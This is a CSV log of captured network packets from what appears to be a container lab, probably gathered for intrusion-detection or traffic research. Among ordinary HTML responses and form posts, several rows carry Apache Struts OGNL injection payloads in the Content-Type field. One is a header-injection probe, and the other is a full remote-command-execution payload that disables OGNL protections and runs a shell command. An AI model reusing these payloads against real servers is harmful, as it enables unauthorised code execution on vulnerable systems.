sniff_time,length,highest_layer,time_stamp,ip,port,content_type
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:18.615525,459,DATA-TEXT-LINES,1521394938.615525000,10.0.2.2,8080,text/html;charset=UTF-8
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:42:22.143351,459,DATA-TEXT-LINES,1521394942.143351000,10.0.2.2,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.853758,358,HTTP,1521394990.853758000,172.17.0.2,44126,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:10.951015,471,DATA-TEXT-LINES,1521394990.951015000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.819160,358,HTTP,1521394995.819160000,172.17.0.2,39926,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:15.907189,471,DATA-TEXT-LINES,1521394995.907189000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:20.997805,358,HTTP,1521395000.997805000,172.17.0.2,48404,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}"
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:21.047197,471,DATA-TEXT-LINES,1521395001.047197000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.895408,969,URLENCODED-FORM,1521395031.895408000,172.17.0.2,56412,application/x-www-form-urlencoded
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:51.955920,471,DATA-TEXT-LINES,1521395031.955920000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.210954,969,URLENCODED-FORM,1521395034.210954000,172.17.0.2,60510,application/x-www-form-urlencoded
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:54.295152,471,DATA-TEXT-LINES,1521395034.295152000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.038065,974,URLENCODED-FORM,1521395037.038065000,172.17.0.2,55308,application/x-www-form-urlencoded
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:43:57.116765,471,DATA-TEXT-LINES,1521395037.116765000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.664477,979,URLENCODED-FORM,1521395046.664477000,172.17.0.2,36782,application/x-www-form-urlencoded
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:06.744679,471,DATA-TEXT-LINES,1521395046.744679000,172.17.0.1,8080,text/html;charset=ISO-8859-1
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
2018-03-18 12:44:21.490042,1020,HTTP,1521395061.490042000,172.17.0.2,53886,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
